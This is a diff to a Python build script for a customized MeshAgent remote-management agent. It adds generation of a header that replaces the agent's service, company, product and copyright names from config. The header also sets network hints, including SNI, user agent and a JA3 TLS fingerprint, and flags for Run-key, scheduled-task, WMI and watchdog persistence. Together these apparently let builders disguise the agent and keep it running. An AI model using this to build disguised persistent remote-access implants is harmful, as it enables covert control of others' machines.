@@ -57,6 +57,63 @@ def cmd_package(args: argparse.Namespace) -> None:
     print("[meshagent-build] package step placeholder (Windows NSIS/PowerShell required)")
 
 
+def write_branding_header(config: Dict[str, Any], output: pathlib.Path) -> None:
+    branding = config.get("branding", {})
+    network = config.get("network", {})
+    persistence = config.get("persistence", {})
+
+    def text_literal(value: str | None) -> str:
+        if value is None:
+            return "NULL"
+        return f'TEXT("{value}")'
+
+    def str_literal(value: str | None) -> str:
+        if value is None:
+            return "NULL"
+        escaped = value.replace("\\", "\\\\").replace("\"", "\\\"")
+        return f'"{escaped}"'
+
+    content = [
+        "/* Generated file – do not edit. */",
+        "#ifndef GENERATED_MESHAGENT_BRANDING_H",
+        "#define GENERATED_MESHAGENT_BRANDING_H",
+        "",
+        f"#undef MESH_AGENT_SERVICE_FILE\n#define MESH_AGENT_SERVICE_FILE {text_literal(branding.get('serviceName') or 'Mesh Agent')} ",
+        f"#undef MESH_AGENT_SERVICE_NAME\n#define MESH_AGENT_SERVICE_NAME {text_literal(branding.get('displayName') or 'Mesh Agent background service')} ",
+        f"#undef MESH_AGENT_COMPANY_NAME\n#define MESH_AGENT_COMPANY_NAME {str_literal(branding.get('companyName') or 'MeshCentral')} ",
+        f"#undef MESH_AGENT_PRODUCT_NAME\n#define MESH_AGENT_PRODUCT_NAME {str_literal(branding.get('productName') or 'MeshCentral Agent')} ",
+        f"#undef MESH_AGENT_FILE_DESCRIPTION\n#define MESH_AGENT_FILE_DESCRIPTION {str_literal(branding.get('description') or 'Mesh Agent')} ",
+        f"#undef MESH_AGENT_INTERNAL_NAME\n#define MESH_AGENT_INTERNAL_NAME {str_literal(branding.get('binaryName') or 'meshagent.exe')} ",
+        f"#undef MESH_AGENT_COPYRIGHT\n#define MESH_AGENT_COPYRIGHT {str_literal(branding.get('versionInfo', {}).get('legalCopyright') or 'Apache 2.0 License')} ",
+        f"#undef MESH_AGENT_LOG_DIRECTORY\n#define MESH_AGENT_LOG_DIRECTORY {text_literal(branding.get('logPath') or '%ProgramData%\\\\Mesh Agent')} ",
+        "",
+        "/* Optional network hints for future use */",
+        f"#define MESH_AGENT_NETWORK_ENDPOINT {str_literal(network.get('primaryEndpoint'))}",
+        f"#define MESH_AGENT_NETWORK_SNI {str_literal(network.get('sni'))}",
+        f"#define MESH_AGENT_NETWORK_USER_AGENT {str_literal(network.get('userAgent'))}",
+        f"#define MESH_AGENT_NETWORK_JA3 {str_literal(network.get('ja3'))}",
+        "",
+        "/* Persistence flags */",
+        f"#define MESH_AGENT_PERSIST_RUNKEY {(1 if persistence.get('runKey') else 0)}",
+        f"#define MESH_AGENT_PERSIST_TASK {(1 if persistence.get('scheduledTask', {}).get('enabled') else 0)}",
+        f"#define MESH_AGENT_PERSIST_WMI {(1 if persistence.get('wmi', {}).get('enabled') else 0)}",
+        f"#define MESH_AGENT_PERSIST_WATCHDOG {(1 if persistence.get('watchdog', {}).get('enabled') else 0)}",
+        "",
+        "#endif /* GENERATED_MESHAGENT_BRANDING_H */",
+        "",
+    ]
+    output.write_text("\n".join(content), encoding="utf-8")
+    print(f"[meshagent-build] wrote branding header -> {output}")
+
+
+def cmd_generate(args: argparse.Namespace) -> None:
+    config = load_config(CONFIG_DIR / args.config)
+    meshagent_root = pathlib.Path(args.meshagent_root).resolve()
+    header_dir = meshagent_root / "meshcore" / "generated"
+    header_dir.mkdir(parents=True, exist_ok=True)
+    write_branding_header(config, header_dir / "meshagent_branding.h")
+
+
 def build_parser() -> argparse.ArgumentParser:
     parser = argparse.ArgumentParser(description="Custom MeshAgent build pipeline")
     sub = parser.add_subparsers(dest="command", required=True)
@@ -70,6 +127,11 @@ def build_parser() -> argparse.ArgumentParser:
 
     patch = sub.add_parser("patch", help="Apply custom patch sets")
     patch.set_defaults(func=cmd_patch)
+
+    generate = sub.add_parser("generate", help="Generate branding headers from config")
+    generate.add_argument("--config", default="meshagent.json")
+    generate.add_argument("--meshagent-root", default=str((ROOT / ".." / "meshagent").resolve()))
+    generate.set_defaults(func=cmd_generate)
 
     package = sub.add_parser("package", help="Build and package installers (Windows only)")
     package.add_argument("--config", default="meshagent.json")
